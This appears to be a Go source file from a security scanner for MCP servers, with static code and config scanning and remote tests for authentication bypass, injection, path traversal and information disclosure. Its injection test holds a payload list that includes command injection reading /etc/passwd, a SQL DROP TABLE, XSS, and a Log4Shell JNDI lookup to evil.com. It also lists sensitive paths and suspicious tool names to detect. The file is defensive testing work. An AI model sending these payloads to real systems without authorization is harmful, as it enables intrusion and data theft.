package scanner

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/syphon1c/mcp-security-scanner/internal/integration"
	"github.com/syphon1c/mcp-security-scanner/internal/mcp"
	"github.com/syphon1c/mcp-security-scanner/internal/policy"
	"github.com/syphon1c/mcp-security-scanner/pkg/types"
)

// Scanner performs security scans on MCP servers
type Scanner struct {
	policyEngine   *policy.Engine
	mcpClient      *mcp.Client
	config         types.ScannerConfig
	alertProcessor *integration.AlertProcessor
}

// NewScanner creates a new security scanner with integrated alert processing
func NewScanner(config types.ScannerConfig, alertProcessor *integration.AlertProcessor) (*Scanner, error) {
	policyEngine := policy.NewEngine()

	// Load policies from directory
	err := policyEngine.LoadPoliciesFromDirectory(config.PolicyDirectory)
	if err != nil {
		return nil, fmt.Errorf("failed to load policies: %v", err)
	}

	mcpClient := mcp.NewClient(config.Timeout, config.UserAgent)

	return &Scanner{
		policyEngine:   policyEngine,
		mcpClient:      mcpClient,
		config:         config,
		alertProcessor: alertProcessor,
	}, nil
}

// ScanLocalMCPServer performs a static security scan of a local MCP server
func (s *Scanner) ScanLocalMCPServer(serverPath string, policyName string) (*types.ScanResult, error) {
	log.Printf("Starting static scan of local MCP server: %s", serverPath)

	policy, err := s.policyEngine.GetPolicy(policyName)
	if err != nil {
		return nil, err
	}

	result := &types.ScanResult{
		Timestamp:  time.Now(),
		Target:     serverPath,
		PolicyUsed: policyName,
		Findings:   []types.Finding{},
	}

	// Scan source code for vulnerabilities
	err = s.scanSourceCode(serverPath, policy, result)
	if err != nil {
		return nil, fmt.Errorf("source code scan failed: %v", err)
	}

	// Scan configuration files
	err = s.scanConfiguration(serverPath, policy, result)
	if err != nil {
		return nil, fmt.Errorf("configuration scan failed: %v", err)
	}

	// Calculate risk score and summary
	s.CalculateRiskScore(result)
	s.generateSummary(result)

	// Process scan results through enterprise integrations
	if s.alertProcessor != nil {
		go s.alertProcessor.ProcessScanResult(result)
	}

	return result, nil
}

// ScanRemoteMCPServer performs a dynamic security scan of a remote MCP server
func (s *Scanner) ScanRemoteMCPServer(serverURL string, policyName string) (*types.ScanResult, error) {
	log.Printf("Starting remote scan of MCP server: %s", serverURL)

	policy, err := s.policyEngine.GetPolicy(policyName)
	if err != nil {
		return nil, err
	}

	result := &types.ScanResult{
		Timestamp:  time.Now(),
		Target:     serverURL,
		PolicyUsed: policyName,
		Findings:   []types.Finding{},
	}

	// Discover MCP server capabilities
	serverInfo, err := s.discoverMCPCapabilities(serverURL)
	if err != nil {
		return nil, fmt.Errorf("capability discovery failed: %v", err)
	}
	result.MCPServer = *serverInfo

	// Test for common vulnerabilities
	err = s.testRemoteVulnerabilities(serverURL, policy, result)
	if err != nil {
		return nil, fmt.Errorf("vulnerability testing failed: %v", err)
	}

	// Analyze tools and resources for security issues
	err = s.analyzeToolsAndResources(serverInfo, policy, result)
	if err != nil {
		return nil, fmt.Errorf("tool analysis failed: %v", err)
	}

	s.CalculateRiskScore(result)
	s.generateSummary(result)

	// Process scan results through enterprise integrations
	if s.alertProcessor != nil {
		go s.alertProcessor.ProcessScanResult(result)
	}

	return result, nil
}

// scanSourceCode performs comprehensive static analysis of source code files for security vulnerabilities.
// It recursively walks through the server directory, identifies source code files, and applies security rules
// from the loaded policy. The function detects various vulnerability classes including injection flaws,
// insecure file access patterns, cryptographic issues, and blocked patterns.
//
// Parameters:
//   - serverPath: Root directory path containing the MCP server source code
//   - policy: Security policy containing rules and patterns to apply during scanning
//   - result: Scan result struct that will be populated with discovered vulnerabilities
//
// Returns:
//   - error: Non-nil if directory traversal fails or file reading encounters critical errors
//
// The function applies advanced pattern detection for polymorphic threats and maintains
// detailed evidence extraction for each finding including line numbers and code context.
func (s *Scanner) scanSourceCode(serverPath string, policy *types.SecurityPolicy, result *types.ScanResult) error {
	return filepath.Walk(serverPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Skip non-source files
		if !s.isSourceFile(path) {
			return nil
		}

		content, err := os.ReadFile(path)
		if err != nil {
			return err
		}

		// Apply security rules to source code
		for _, rule := range policy.Rules {
			if rule.Category == "source_code" || rule.Category == "all" || rule.Category == "injection" || rule.Category == "file_access" || rule.Category == "cryptography" {
				s.applyRuleToContent(string(content), rule, path, result)
			}
		}

		// Check for blocked patterns
		for _, pattern := range policy.BlockedPatterns {
			s.checkBlockedPattern(string(content), pattern, path, result)
		}

		//  Apply advanced pattern detection
		advancedDetector := NewAdvancedPatternDetector(s)
		advancedDetector.DetectAdvancedThreats(string(content), path, policy, result)

		return nil
	})
}

// scanConfiguration performs security analysis of configuration files to identify potential vulnerabilities.
// It searches for configuration files by extension (.json, .yaml, .yml, .xml, .ini, .conf, .config)
// and applies policy rules specifically designed for configuration analysis. The function also performs
// specialized checks for sensitive data exposure in configuration files.
//
// Parameters:
//   - serverPath: Root directory path to scan for configuration files
//   - policy: Security policy containing configuration-specific rules and patterns
//   - result: Scan result struct that will be populated with configuration vulnerabilities
//
// Returns:
//   - error: Non-nil if directory traversal fails or critical file reading errors occur
//
// Common vulnerabilities detected include hardcoded credentials, exposed API keys,
// insecure default settings, and configuration injection vulnerabilities.
func (s *Scanner) scanConfiguration(serverPath string, policy *types.SecurityPolicy, result *types.ScanResult) error {
	configExtensions := []string{".json", ".yaml", ".yml", ".xml", ".ini", ".conf", ".config"}

	return filepath.Walk(serverPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Check if file is a configuration file
		ext := strings.ToLower(filepath.Ext(path))
		isConfigFile := false
		for _, configExt := range configExtensions {
			if ext == configExt {
				isConfigFile = true
				break
			}
		}

		if !isConfigFile {
			return nil
		}

		content, err := os.ReadFile(path)
		if err != nil {
			return err
		}

		// Apply security rules to configuration files
		for _, rule := range policy.Rules {
			if rule.Category == "configuration" || rule.Category == "all" {
				s.applyRuleToContent(string(content), rule, path, result)
			}
		}

		// Check for sensitive data in config files
		s.checkForSensitiveDataInConfig(string(content), path, result)

		return nil
	})
}

// discoverMCPCapabilities performs automated discovery of MCP server capabilities, tools, and resources.
// It establishes a connection to the remote MCP server, performs protocol negotiation, and enumerates
// available tools and resources. This information is essential for subsequent vulnerability testing.
//
// Parameters:
//   - serverURL: Complete URL of the target MCP server including protocol and port
//
// Returns:
//   - *types.MCPServerInfo: Detailed information about server capabilities, tools, and resources
//   - error: Non-nil if connection fails, protocol negotiation fails, or capability enumeration fails
//
// The discovery process follows the MCP protocol specification:
// 1. Establishes connection and performs protocol handshake
// 2. Calls tools/list to enumerate available tools and their schemas
// 3. Calls resources/list to discover accessible resources
// 4. Validates tool and resource schemas for completeness
func (s *Scanner) discoverMCPCapabilities(serverURL string) (*types.MCPServerInfo, error) {
	// Initialize connection
	serverInfo, err := s.mcpClient.Initialize(serverURL)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize MCP connection: %v", err)
	}

	// Discover tools
	tools, err := s.mcpClient.ListTools(serverURL)
	if err != nil {
		log.Printf("Tool discovery failed: %v", err)
		// Continue with empty tools list
	} else {
		serverInfo.Tools = tools
	}

	// Discover resources
	resources, err := s.mcpClient.ListResources(serverURL)
	if err != nil {
		log.Printf("Resource discovery failed: %v", err)
		// Continue with empty resources list
	} else {
		serverInfo.Resources = resources
	}

	return serverInfo, nil
}

// testRemoteVulnerabilities tests for common vulnerabilities in remote MCP servers
func (s *Scanner) testRemoteVulnerabilities(serverURL string, policy *types.SecurityPolicy, result *types.ScanResult) error {
	// Test for authentication bypass
	err := s.testAuthenticationBypass(serverURL, result)
	if err != nil {
		log.Printf("Authentication bypass test failed: %v", err)
	}

	// Test for injection vulnerabilities
	err = s.testInjectionVulnerabilities(serverURL, policy, result)
	if err != nil {
		log.Printf("Injection test failed: %v", err)
	}

	// Test for information disclosure
	err = s.testInformationDisclosure(serverURL, result)
	if err != nil {
		log.Printf("Information disclosure test failed: %v", err)
	}

	//  Test for MCP-specific vulnerabilities
	err = s.testMCPSpecificVulnerabilities(serverURL, result)
	if err != nil {
		log.Printf("MCP-specific vulnerability test failed: %v", err)
	}

	return nil
}

// testMCPSpecificVulnerabilities tests for MCP protocol-specific attack vectors
func (s *Scanner) testMCPSpecificVulnerabilities(serverURL string, result *types.ScanResult) error {
	// Create MCP vulnerability tester
	mcpTester := NewMCPVulnerabilityTester(s)

	// Get tools and resources for testing
	tools, err := s.mcpClient.ListTools(serverURL)
	if err != nil {
		log.Printf("Failed to list tools for MCP vulnerability testing: %v", err)
	} else {
		// Test for tool poisoning vulnerabilities
		toolFindings := mcpTester.TestToolPoisoning(serverURL, tools)
		result.Findings = append(result.Findings, toolFindings...)
	}

	resources, err := s.mcpClient.ListResources(serverURL)
	if err != nil {
		log.Printf("Failed to list resources for MCP vulnerability testing: %v", err)
	} else {
		// Test for resource manipulation vulnerabilities
		resourceFindings := mcpTester.TestResourceManipulation(serverURL, resources)
		result.Findings = append(result.Findings, resourceFindings...)
	}

	return nil
}

// testAuthenticationBypass tests for authentication bypass vulnerabilities
func (s *Scanner) testAuthenticationBypass(serverURL string, result *types.ScanResult) error {
	// Test accessing protected methods without authentication
	testMethods := []string{"tools/list", "resources/list", "admin/config", "system/status"}

	for _, method := range testMethods {
		testMsg := types.MCPMessage{
			JSONRPC: "2.0",
			ID:      1,
			Method:  method,
		}

		responseBody, err := s.mcpClient.SendRequest(serverURL+"/mcp/tools/call", testMsg)
		if err != nil {
			continue // Expected for protected endpoints
		}

		// Check if we received a successful response when we shouldn't have
		if strings.Contains(string(responseBody), "result") && !strings.Contains(string(responseBody), "error") {
			finding := types.Finding{
				ID:          fmt.Sprintf("auth-bypass-%d", time.Now().UnixNano()),
				RuleID:      "AUTH_BYPASS_001",
				Severity:    "High",
				Category:    "Authentication",
				Title:       "Potential Authentication Bypass",
				Description: fmt.Sprintf("Method '%s' accessible without authentication", method),
				Evidence:    fmt.Sprintf("Response: %s", string(responseBody)),
				Location:    serverURL,
				Remediation: "Implement proper authentication for protected methods",
				Timestamp:   time.Now(),
			}
			result.Findings = append(result.Findings, finding)
		}
	}

	return nil
}

// testInformationDisclosure tests for information disclosure vulnerabilities
func (s *Scanner) testInformationDisclosure(serverURL string, result *types.ScanResult) error {
	// Test for verbose error messages
	testMsg := types.MCPMessage{
		JSONRPC: "2.0",
		ID:      1,
		Method:  "nonexistent_method_test_12345",
	}

	responseBody, err := s.mcpClient.SendRequest(serverURL+"/debug/info", testMsg)
	if err != nil {
		return err
	}

	response := string(responseBody)

	// Check for information disclosure in error messages
	disclosurePatterns := []string{
		"stack trace",
		"file path",
		"database.*error",
		"internal.*error",
		"Exception.*at.*line",
		"/home/",
		"/usr/",
		"C:\\\\",
		"python.*traceback",
		"node.*modules",
	}

	for _, pattern := range disclosurePatterns {
		matched, _ := regexp.MatchString("(?i)"+pattern, response)
		if matched {
			finding := types.Finding{
				ID:          fmt.Sprintf("info-disclosure-%d", time.Now().UnixNano()),
				RuleID:      "INFO_DISCLOSURE_001",
				Severity:    "Medium",
				Category:    "Information Disclosure",
				Title:       "Information Disclosure in Error Messages",
				Description: "Server exposes sensitive information in error responses",
				Evidence:    fmt.Sprintf("Pattern '%s' found in: %s", pattern, response),
				Location:    serverURL,
				Remediation: "Implement generic error messages that don't expose internal details",
				Timestamp:   time.Now(),
			}
			result.Findings = append(result.Findings, finding)
			break // Only report once per test
		}
	}

	return nil
}

// testInjectionVulnerabilities tests for injection vulnerabilities
func (s *Scanner) testInjectionVulnerabilities(serverURL string, policy *types.SecurityPolicy, result *types.ScanResult) error {
	// Common injection payloads
	injectionPayloads := []string{
		"; cat /etc/passwd",
		"$(whoami)",
		"& dir C:\\",
		"| net user",
		"`id`",
		"'; DROP TABLE users; --",
		"<script>alert('xss')</script>",
		"{{7*7}}",
		"${jndi:ldap://evil.com/a}",
		"../../../etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	}

	for _, payload := range injectionPayloads {
		// Test tool calls with injection payloads
		err := s.testToolCallInjection(serverURL, payload, result)
		if err != nil {
			continue // Continue testing other payloads
		}

		// Test resource requests with injection payloads
		err = s.testResourceInjection(serverURL, payload, result)
		if err != nil {
			continue
		}
	}

	return nil
}

// testToolCallInjection tests tool calls for injection vulnerabilities
func (s *Scanner) testToolCallInjection(serverURL, payload string, result *types.ScanResult) error {
	// Craft malicious tool call
	toolCall := types.MCPMessage{
		JSONRPC: "2.0",
		ID:      1,
		Method:  "tools/call",
		Params: map[string]interface{}{
			"name":      "test_tool",
			"arguments": map[string]interface{}{"input": payload},
		},
	}

	responseBody, err := s.mcpClient.SendRequest(serverURL+"/mcp/tools/call", toolCall)
	if err != nil {
		return err
	}

	// Analyze response for signs of successful injection
	if s.detectInjectionSuccess(responseBody, payload) {
		finding := types.Finding{
			ID:          fmt.Sprintf("injection-%d", time.Now().UnixNano()),
			RuleID:      "INJECTION_001",
			Severity:    "Critical",
			Category:    "Command Injection",
			Title:       "Command Injection Vulnerability Detected",
			Description: "MCP server appears vulnerable to command injection via tool calls",
			Evidence:    fmt.Sprintf("Payload: %s, Response: %s", payload, string(responseBody)),
			Location:    serverURL,
			Remediation: "Implement proper input validation and sanitization",
			Timestamp:   time.Now(),
		}
		result.Findings = append(result.Findings, finding)
	}

	return nil
}

// testResourceInjection tests resource requests for injection vulnerabilities
func (s *Scanner) testResourceInjection(serverURL, payload string, result *types.ScanResult) error {
	// Craft malicious resource request
	resourceCall := types.MCPMessage{
		JSONRPC: "2.0",
		ID:      1,
		Method:  "resources/read",
		Params: map[string]interface{}{
			"uri": payload,
		},
	}

	responseBody, err := s.mcpClient.SendRequest(serverURL+"/mcp/resources/read", resourceCall)
	if err != nil {
		return err
	}

	// Check for path traversal success
	response := string(responseBody)
	if strings.Contains(response, "root:") || strings.Contains(response, "admin:") ||
		strings.Contains(response, "[users]") || strings.Contains(response, "password") {
		finding := types.Finding{
			ID:          fmt.Sprintf("path-traversal-%d", time.Now().UnixNano()),
			RuleID:      "PATH_TRAVERSAL_001",
			Severity:    "High",
			Category:    "Path Traversal",
			Title:       "Path Traversal Vulnerability Detected",
			Description: "MCP server vulnerable to path traversal via resource requests",
			Evidence:    fmt.Sprintf("Payload: %s, Response: %s", payload, response),
			Location:    serverURL,
			Remediation: "Implement proper path validation and access controls",
			Timestamp:   time.Now(),
		}
		result.Findings = append(result.Findings, finding)
	}

	return nil
}

// analyzeToolsAndResources analyzes discovered tools and resources for security issues
func (s *Scanner) analyzeToolsAndResources(serverInfo *types.MCPServerInfo, policy *types.SecurityPolicy, result *types.ScanResult) error {
	// Analyze tools for suspicious patterns
	for _, tool := range serverInfo.Tools {
		// Check tool names for suspicious patterns
		suspiciousToolPatterns := []string{
			"exec", "system", "shell", "cmd", "eval", "run", "execute",
			"file", "read", "write", "delete", "remove",
			"admin", "root", "sudo", "privilege",
		}

		for _, pattern := range suspiciousToolPatterns {
			if strings.Contains(strings.ToLower(tool.Name), pattern) {
				finding := types.Finding{
					ID:          fmt.Sprintf("suspicious-tool-%d", time.Now().UnixNano()),
					RuleID:      "TOOL_ANALYSIS_001",
					Severity:    "Medium",
					Category:    "Tool Analysis",
					Title:       "Suspicious Tool Detected",
					Description: fmt.Sprintf("Tool '%s' has suspicious name pattern", tool.Name),
					Evidence:    fmt.Sprintf("Tool: %s, Description: %s", tool.Name, tool.Description),
					Location:    "tools",
					Remediation: "Review tool functionality and ensure proper access controls",
					Timestamp:   time.Now(),
				}
				result.Findings = append(result.Findings, finding)
				break
			}
		}
	}

	// Analyze resources for sensitive paths
	for _, resource := range serverInfo.Resources {
		sensitivePathPatterns := []string{
			"/etc/", "/var/log/", "/home/", "/root/",
			"C:\\Windows\\", "C:\\Users\\",
			".env", "config", "secret", "key", "password",
		}

		for _, pattern := range sensitivePathPatterns {
			if strings.Contains(strings.ToLower(resource.URI), strings.ToLower(pattern)) {
				finding := types.Finding{
					ID:          fmt.Sprintf("sensitive-resource-%d", time.Now().UnixNano()),
					RuleID:      "RESOURCE_ANALYSIS_001",
					Severity:    "High",
					Category:    "Resource Analysis",
					Title:       "Sensitive Resource Exposed",
					Description: fmt.Sprintf("Resource exposes potentially sensitive path: %s", resource.URI),
					Evidence:    fmt.Sprintf("Resource: %s, URI: %s", resource.Name, resource.URI),
					Location:    "resources",
					Remediation: "Restrict access to sensitive resources",
					Timestamp:   time.Now(),
				}
				result.Findings = append(result.Findings, finding)
				break
			}
		}
	}

	return nil
}

// Helper methods continue in next part...
